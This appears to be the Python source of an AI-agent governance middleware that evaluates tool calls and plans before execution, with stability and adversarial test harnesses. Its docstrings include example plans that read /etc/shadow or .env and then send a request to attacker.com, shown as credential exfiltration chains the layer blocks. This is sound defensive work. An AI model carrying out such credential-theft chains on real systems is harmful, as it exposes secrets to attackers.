"""
Morrison Governance Layer.

The primary API surface for runtime governance.

    from morrison_governance import GovernanceLayer, OmegaDomain

    # Initialize with domains
    governance = GovernanceLayer(
        domains=[OmegaDomain.FINANCE, OmegaDomain.CYBERSECURITY]
    )

    # Evaluate a single tool call
    result = governance.evaluate({"tool": "transfer", "args": {"amount": 50000}})
    assert result.blocked  # unauthorized transfer → BLOCK

    # Evaluate a multi-step plan
    result = governance.evaluate_plan([
        {"tool": "read_file", "args": {"path": "/etc/shadow"}},
        {"tool": "http_request", "args": {"url": "https://attacker.com"}},
    ])
    assert result.blocked  # credential exfiltration chain → BLOCK

    # Evaluate from OpenAI function calling response
    result = governance.evaluate_openai(response.choices[0].message.tool_calls)
"""

# Builtin generic annotations (dict[...], list[...]) below are evaluated
# at definition time and need Python 3.9+. Deferring evaluation keeps the
# syntax while restoring importability on older interpreters.
from __future__ import annotations

import time
import logging
from typing import Any, Callable, Optional

from morrison_governance.admissibility import (
    AdmissibilityCheck, AdmissibilityEvaluator,
)
from morrison_governance.adversarial import AdversarialReport, run_attack_suite
from morrison_governance.domains import OmegaDomain, OmegaRule, get_default_rules
from morrison_governance.feasibility import (
    FeasibilityEvaluator, FeasibilityReport, GoalPredicate,
)
from morrison_governance.reachability import ReachabilityEvaluator
from morrison_governance.result import GovernanceResult, GovernanceVerdict
from morrison_governance.stability import (
    PerturbationGenerator, StabilityEvaluator, StabilityReport,
)
from morrison_governance.trajectory import TrajectoryExtractor, Trajectory

logger = logging.getLogger("morrison_governance")


class GovernanceLayer:
    """
    Pre-execution governance middleware.

    Sits between LLM planner and tool execution.
    Evaluates reachability into Ω before any action occurs.

    Core invariant: Safe ⟺ ∀ E ∈ ℰ, ℛ_E(t) ∩ Ω = ∅
    """

    def __init__(
        self,
        domains: Optional[list[OmegaDomain]] = None,
        custom_rules: Optional[list[OmegaRule]] = None,
        context: Optional[dict] = None,
        horizon: int = 3,
        log_all: bool = True,
        admissibility_checks: Optional[list[AdmissibilityCheck]] = None,
        enable_taint: bool = True,
        internal_email_domains: tuple[str, ...] = (),
        internal_url_hosts: tuple[str, ...] = (),
        enable_forecast: bool = True,
        forecast_horizon: int = 4,
    ):
        """
        Args:
            domains: list of Ω domains to enforce (loads default rules)
            custom_rules: additional custom Ω rules
            context: persistent context (user role, session metadata, auth flags)
            horizon: forward reachability horizon (V3)
            log_all: whether to log all evaluations
            admissibility_checks: optional V4 structural checks (permissions,
                                  resource scope, schema, etc.). Pass an empty
                                  list to disable V4 explicitly.
            enable_taint: V2 source→sink data-flow tracking (default on)
            internal_email_domains: email domains treated as internal sinks
            internal_url_hosts: URL hosts treated as internal sinks
        """
        # Assemble rules
        self.rules: list[OmegaRule] = []
        if domains:
            for domain in domains:
                self.rules.extend(get_default_rules(domain))
        if custom_rules:
            self.rules.extend(custom_rules)

        self.extractor = TrajectoryExtractor(context=context)
        admissibility = (
            AdmissibilityEvaluator(checks=list(admissibility_checks))
            if admissibility_checks is not None else None
        )
        self._taint_cfg = dict(
            enable_taint=enable_taint,
            internal_email_domains=tuple(internal_email_domains),
            internal_url_hosts=tuple(internal_url_hosts),
            enable_forecast=enable_forecast,
            forecast_horizon=forecast_horizon,
        )
        self.evaluator = ReachabilityEvaluator(
            rules=self.rules, horizon=horizon, admissibility=admissibility,
            **self._taint_cfg,
        )
        self.log_all = log_all

        # Counters
        self._eval_count = 0
        self._block_count = 0
        self._permit_count = 0

        logger.info(
            f"GovernanceLayer initialized: {len(self.rules)} rules, "
            f"{len(domains or [])} domains, horizon={horizon}"
        )

    # ═══════════════════════════════════════════════════════════
    # PRIMARY API
    # ═══════════════════════════════════════════════════════════

    def evaluate(self, tool_call: dict) -> GovernanceResult:
        """
        Evaluate a single tool call.

            result = governance.evaluate({
                "tool": "send_email",
                "args": {"to": "ceo@company.com", "body": "..."}
            })
        """
        trajectory = self.extractor.from_dict(tool_call)
        return self._run(trajectory)

    def evaluate_plan(self, steps: list[dict]) -> GovernanceResult:
        """
        Evaluate a multi-step tool call plan.

            result = governance.evaluate_plan([
                {"tool": "read_file", "args": {"path": ".env"}},
                {"tool": "http_request", "args": {"url": "https://..."}},
            ])
        """
        trajectory = self.extractor.from_plan(steps)
        return self._run(trajectory)

    def evaluate_openai(self, tool_calls: list) -> GovernanceResult:
        """
        Evaluate from OpenAI function calling response.

            result = governance.evaluate_openai(
                response.choices[0].message.tool_calls
            )
        """
        trajectory = self.extractor.from_openai(tool_calls)
        return self._run(trajectory)

    def evaluate_langchain(self, agent_actions: Any) -> GovernanceResult:
        """
        Evaluate from LangChain AgentAction(s).

            result = governance.evaluate_langchain(agent_action)
        """
        trajectory = self.extractor.from_langchain(agent_actions)
        return self._run(trajectory)

    def evaluate_trajectory(self, trajectory: Trajectory) -> GovernanceResult:
        """
        Evaluate a pre-extracted trajectory directly.
        """
        return self._run(trajectory)

    # ═══════════════════════════════════════════════════════════
    # MIDDLEWARE INTERFACE
    # ═══════════════════════════════════════════════════════════

    def __call__(self, tool_call: dict) -> GovernanceResult:
        """
        Callable interface for middleware insertion.

            governance = GovernanceLayer(domains=[OmegaDomain.FINANCE])

            # Use as middleware
            for call in tool_calls:
                result = governance(call)
                if result.permitted:
                    execute(call)
        """
        return self.evaluate(tool_call)

    # ═══════════════════════════════════════════════════════════
    # INTERNALS
    # ═══════════════════════════════════════════════════════════

    def _run(self, trajectory: Trajectory) -> GovernanceResult:
        """Execute the enforcement hierarchy and log result."""
        start = time.perf_counter()
        result = self.evaluator.evaluate(trajectory)
        elapsed = time.perf_counter() - start

        # Update counters
        self._eval_count += 1
        if result.permitted:
            self._permit_count += 1
        else:
            self._block_count += 1

        result.metadata["eval_time_ms"] = round(elapsed * 1000, 2)
        result.metadata["eval_number"] = self._eval_count

        if self.log_all:
            status = "PERMIT" if result.permitted else "BLOCK"
            logger.info(
                f"[{status}] eval={self._eval_count} "
                f"layer={result.layer} "
                f"hash={result.trajectory_hash} "
                f"time={elapsed * 1000:.1f}ms "
                f"reason={result.reason!r}"
            )

        return result

    # ═══════════════════════════════════════════════════════════
    # CONFIGURATION
    # ═══════════════════════════════════════════════════════════

    def add_rule(self, rule: OmegaRule) -> None:
        """Add a custom Ω rule at runtime."""
        self.rules.append(rule)
        self.evaluator = ReachabilityEvaluator(
            rules=self.rules, horizon=self.evaluator.horizon,
            admissibility=self.evaluator.admissibility,
            **self._taint_cfg,
        )

    def add_domain(self, domain: OmegaDomain) -> None:
        """Add all default rules for a domain."""
        new_rules = get_default_rules(domain)
        self.rules.extend(new_rules)
        self.evaluator = ReachabilityEvaluator(
            rules=self.rules, horizon=self.evaluator.horizon,
            admissibility=self.evaluator.admissibility,
            **self._taint_cfg,
        )

    def add_admissibility_check(self, check: AdmissibilityCheck) -> None:
        """Add a V4 admissibility check at runtime."""
        if self.evaluator.admissibility is None:
            self.evaluator.admissibility = AdmissibilityEvaluator(checks=[])
        self.evaluator.admissibility.checks.append(check)

    @property
    def stats(self) -> dict:
        return {
            "evaluations": self._eval_count,
            "permits": self._permit_count,
            "blocks": self._block_count,
            "rules": len(self.rules),
            "admissibility_checks": (
                len(self.evaluator.admissibility.checks)
                if self.evaluator.admissibility else 0
            ),
            "block_rate": (
                self._block_count / self._eval_count if self._eval_count > 0 else 0
            ),
        }

    # ═══════════════════════════════════════════════════════════
    # V4+ — FEASIBILITY (NO_VALID_SAFE_TRAJECTORY)
    # ═══════════════════════════════════════════════════════════

    def find_admissible(
        self,
        candidate_plans: list[list[dict]],
        goal: GoalPredicate,
    ) -> tuple[GovernanceResult, list[FeasibilityReport]]:
        """
        Select the first candidate plan that (a) clears A_safe → V2 → V3 → V4
        and (b) satisfies the supplied goal predicate.

        Returns a NO_VALID_SOLUTION verdict when no candidate qualifies, so
        the caller refuses to execute rather than picking an unsafe default.

            r, reports = governance.find_admissible(
                candidate_plans=[[step1, step2], [step1_alt, step2_alt]],
                goal=goal_uses_tool("send_email"),
            )
        """
        candidates = [self.extractor.from_plan(p) if len(p) > 1
                      else self.extractor.from_dict(p[0])
                      for p in candidate_plans]
        feasibility = FeasibilityEvaluator(runner=self._run)
        return feasibility.find_admissible(candidates, goal)

    # ═══════════════════════════════════════════════════════════
    # V5 — ENVIRONMENT-WIDE STABILITY
    # ═══════════════════════════════════════════════════════════

    def evaluate_stable(
        self,
        tool_call: dict,
        perturbations: Optional[list[tuple[str, PerturbationGenerator]]] = None,
        n_per_class: int = 5,
        seed: int = 0,
    ) -> tuple[GovernanceResult, StabilityReport]:
        """
        V5: evaluate the call across environment perturbations and require
        the verdict to be stable. Returns ENVIRONMENT_SENSITIVE if any
        perturbation flips the verdict.

            r, report = governance.evaluate_stable(call, n_per_class=10, seed=42)
            assert r.verdict != GovernanceVerdict.ENVIRONMENT_SENSITIVE
        """
        stability = StabilityEvaluator(runner=self.evaluate)
        return stability.evaluate_stability(
            baseline_call=tool_call,
            perturbations=perturbations,
            n_per_class=n_per_class,
            seed=seed,
        )

    # ═══════════════════════════════════════════════════════════
    # V5 (manifold) — BOUNDED-BALL ROBUSTNESS  ∀ E ∈ B(ℰ, r)
    # ═══════════════════════════════════════════════════════════

    def estimate_robustness(
        self,
        tool_call: dict,
        radii=(0.0, 0.2, 0.4, 0.6, 0.8, 1.0),
        n_per_family: int = 6,
        seed: int = 0,
    ):
        """Estimate the stability envelope over perturbation manifolds:
        verdict agreement vs structural perturbation radius, robustness
        margin, and collapse threshold. Deterministic for a fixed seed."""
        from morrison_governance.manifold import StabilityEnvelopeEstimator
        est = StabilityEnvelopeEstimator(runner=self.evaluate)
        return est.estimate(tool_call, radii=radii,
                            n_per_family=n_per_family, seed=seed)

    # ═══════════════════════════════════════════════════════════
    # V5+ — HARD ADVERSARIAL TEST HARNESS
    # ═══════════════════════════════════════════════════════════

    def adversarial_test(
        self,
        baseline_call: dict,
        seed: int = 0,
        include_classes: Optional[list[str]] = None,
    ) -> AdversarialReport:
        """
        Run the hard-adversarial attack suite against this governance layer.
        Returns per-attack-class outcomes including which layer caught each
        variant and which bypassed the hierarchy entirely.
        """
        return run_attack_suite(
            baseline=baseline_call,
            evaluator_dict=self.evaluate,
            evaluator_plan=self.evaluate_plan,
            seed=seed,
            include_classes=include_classes,
        )

    # ═══════════════════════════════════════════════════════════
    # DIAGNOSTIC — RUN ALL LAYERS WITHOUT SHORT-CIRCUIT
    # ═══════════════════════════════════════════════════════════

    def evaluate_all(self, tool_call: dict) -> dict:
        """
        Diagnostic-only: evaluate every layer without short-circuiting and
        return a dict {layer: {fired, reason/violations}}. Earlier layers
        do not mask deeper-layer activation here.
        """
        trajectory = self.extractor.from_dict(tool_call)
        return self.evaluator.evaluate_all(trajectory)

    def evaluate_all_plan(self, steps: list[dict]) -> dict:
        """Plan version of evaluate_all."""
        trajectory = self.extractor.from_plan(steps)
        return self.evaluator.evaluate_all(trajectory)
